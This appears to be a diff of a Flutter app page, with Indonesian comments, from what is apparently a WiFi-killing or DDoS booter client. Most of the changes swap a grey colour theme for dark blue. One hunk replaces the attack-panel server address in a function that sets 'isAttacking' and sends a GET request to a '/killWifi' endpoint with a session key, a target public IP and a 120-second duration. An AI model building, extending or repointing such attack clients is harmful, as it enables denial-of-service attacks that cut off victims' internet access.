@@ -26,15 +26,15 @@ class _WifiInternalPageState extends State<WifiInternalPage> with TickerProvider
   late Animation<double> _glowAnimation;
   late Animation<double> _scanAnimation;
 
-// ===== SOFT GREY (LOW OPACITY) =====
-final Color primaryDark  = const Color(0xFFEDEDED);              // background abu terang (solid)
-final Color primaryBlue  = Colors.grey.withOpacity(0.50);       // abu muda hampir solid
-final Color accentBlue   = Colors.black.withOpacity(0.10);      // border hitam tipis
-final Color lightBlue    = Colors.grey.withOpacity(0.50);       // highlight lembut
-final Color primaryWhite = const Color(0xFF111111);              // text utama hitam lembut
-final Color accentGrey   = const Color(0xFF666666);              // text secondary
-final Color cardDark     = Colors.grey.withOpacity(0.50);       // card abu semi-solid
-final Color glassColor   = Colors.grey.withOpacity(0.50);       // glass abu tipis
+  // Warna tema hitam biru
+  final Color primaryDark = const Color(0xFF0A0E27); // Biru gelap pekat
+  final Color primaryBlue = const Color(0xFF1E3A8A); // Biru utama
+  final Color accentBlue = const Color(0xFF3B82F6); // Biru aksen
+  final Color lightBlue = const Color(0xFF60A5FA); // Biru terang
+  final Color primaryWhite = Colors.white;
+  final Color accentGrey = Colors.grey.shade400;
+  final Color cardDark = const Color(0xFF151937); // Biru gelap card
+  final Color glassColor = const Color(0x1FFFFFFF); // Warna kaca transparan
 
   @override
   void initState() {
@@ -117,7 +117,7 @@ final Color glassColor   = Colors.grey.withOpacity(0.50);       // glass abu tip
     HapticFeedback.heavyImpact();
     setState(() => isAttacking = true);
     final url = Uri.parse(
-        "http://kaiieclipse.privateserverr.web.id:3000/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
+        "http://panelbyxiaonotdev.zarxsft.my.id:2033/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
     try {
       final res = await http.get(url);
       if (res.statusCode == 200) {
@@ -244,8 +244,9 @@ final Color glassColor   = Colors.grey.withOpacity(0.50);       // glass abu tip
               begin: Alignment.topLeft,
               end: Alignment.bottomRight,
               colors: [
-                const Color(0xFF202020),
-                const Color(0xFF1A1A1A),
+                primaryDark,
+                const Color(0xFF151937),
+                const Color(0xFF0F172A),
               ],
             ),
           ),
